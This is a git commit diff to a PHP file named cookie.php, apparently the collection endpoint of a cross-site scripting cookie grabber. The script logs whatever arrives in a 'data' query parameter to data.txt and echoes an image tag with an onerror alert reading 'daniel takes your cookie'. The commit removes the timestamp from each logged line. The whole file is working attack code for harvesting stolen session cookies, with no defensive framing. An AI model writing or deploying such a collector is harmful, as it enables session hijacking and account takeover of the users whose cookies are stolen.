7ce83d001173d9315bb666de0989f95a809376f7
Wantgohome <70064195+Wantgohome@users.noreply.github.com>
2021-11-11 01:04:35 +0900

    Update cookie.php

--- cookie.php
+++ cookie.php
@@ -1,9 +1,8 @@
 <?
 
 $cookie=$_GET['data'];
-$atime=date("y-m-d H:i:s");
 $log=fopen("data.txt","a");
-fwrite($log,$atime." ".$cookie."\r\n");
+fwrite($log," ".$cookie."\r\n");
 fclose($log);
 echo "<img src=\'0\' onerror=alert(\"daniel takes your cookie\")></img>";
 
